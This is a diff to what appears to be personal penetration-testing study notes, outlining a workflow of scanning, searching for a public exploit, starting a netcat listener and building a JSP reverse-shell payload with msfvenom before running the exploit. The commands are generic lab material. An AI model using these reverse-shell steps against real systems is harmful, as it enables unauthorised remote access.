@@ -6,16 +6,20 @@ After running the vulners script OR autorecon, we should find some vulnerable po
 
 -- Google search 'arcticmage 8.0.2 exploit'
 
-2. Next we will either download the script from the internet OR use a script internally downloaded to kali.
+2. Next, we will either download the script from the internet OR use a script internally downloaded to kali.
 
 --
 
 -- To download the googled script we will need to 'sudo wget <githubexploit.py>
 
-3. Next, we will execute the script. Depending on the type of exploit this step might look dramatically different.
+3. Next, we will prepare to exploit. In this step we will do things like craft payloads, and set up listeners.
 
 For most scripts we will need to first start by setting up a listener on our machine, this command commonly looks like
 
 nc -nlvp 4343
 
 -- For .jsp files we will use the following script to create the payload 'sudo msfvenom -p java/jsp_shell_reverse_tcp lhost=<my ip> port=4343 -f raw > payload.jsp
+
+4. We will execute the exploit.
+
+-- python2 exploit.py == cat the exploit to learn the exact usage of the exploit. // python2
